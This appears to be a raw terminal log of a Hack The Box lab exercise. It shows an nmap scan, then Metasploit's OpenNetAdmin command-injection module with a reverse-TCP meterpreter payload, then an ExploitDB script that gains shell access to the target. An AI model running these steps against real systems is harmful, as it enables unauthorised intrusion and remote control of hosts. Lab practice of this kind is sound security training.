*********@debian:~/Desktop$ nmap -sV -sC 10.10.10.171
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-03 12:14 EDT
Nmap scan report for 10.10.10.171
Host is up (0.031s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                  
Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds                                                  
*********@debian:~/Desktop$ sudo msfconsole
[sudo] password for *********:                                         
[-] ***rting the Metasploit Framework console.../
[-] * WARNING: No database support: No database YAML file
[-] ***
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v5.0.83-dev-                         ]
+ -- --=[ 1991 exploits - 1088 auxiliary - 340 post       ]
+ -- --=[ 560 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Metasploit can be configured at startup, see msfconsole --help to learn more                                                    

msf5 > search openadmin

Matching Modules
================

   #  Name                                                           Disclosure Date  Rank       Check  Description
   -  ----                                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec  2017-05-30       excellent  Yes    IBM OpenAdmin Tool SOAP welcomeServer PHP Code Execution


msf5 > search opennet

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection


msf5 > use 0
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > show options 
Module options (exploit/unix/webapp/opennetadmin_ping_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /ona/login.php   yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > ip a
[*] exec: ip a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:65:f0:2f brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global enp0s3
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe65:f02f/64 scope link 
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none 
    inet 10.10.14.3/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1001/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::7ff9:27ef:cba8:7ff7/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > 
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set LHOST 10.10.14.3
LHOST => 10.10.14.3
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set RHOST 10.10.10.171
RHOST => 10.10.10.171
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Exploiting...
[*] Command Stager progress - 100.00% done (702/702 bytes)
[*] Exploit completed, but no session was created.
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > 
.
.
.
// Didn't work. Now I typed in OpenNetAdmin Exploits
// ExploitDatabase --> Exploits --> Search --> v18.1.1
// Chose Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
.
.
.
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > nano openNetAdmin.sh
[*] exec: nano openNetAdmin.sh

msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > ls
[*] exec: ls

advent_of_cod     exploitReference.txt  msfinstall       nmap_scan.nmap   prod.dtsConfig  pwn3yb0i.ovpn  trash-can.desktop
computer.desktop  hacktheboxbs          network.desktop  nmap_scan.xml    Prog8.jar       rockyou.txt    user-home.desktop
EthicalHack       home                  nmap_scan.gnmap  openNetAdmin.sh  Prog8RE.java    Tint
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > chmod +x openNetAdmin.sh
[*] exec: chmod +x openNetAdmin.sh                                      
                                                                        
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > exit        
*********@debian:~/Desktop$ ./openNetAdmin.sh 10.10.10.171/ona
$ ls -al                                                                
$ exit                                                                  
$ ^C
*********@debian:~/Desktop$ ./openNetAdmin.sh 10.10.10.171/ona/login.php
$ ls                                                                    
$ ls -al                                                                
$ ^C
*********@debian:~/Desktop$ ./openNetAdmin.sh 10.10.10.171/ona/login.php
$ ls
$ ^C
*********@debian:~/Desktop$ 
*********@debian:~/Desktop$ ./openNetAdmin.sh 
$ ls
$ ls -al
$ ^C
*********@debian:~/Desktop$ ./openNetAdmin.sh 10.10.10.171/ona/login.php
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
.
.
.
// This took forever to get to work. But now we are in. The exploit will be in 
// openNetAdmin.sh
// and the rest of the shell code will be in exploitedTerminal.bash
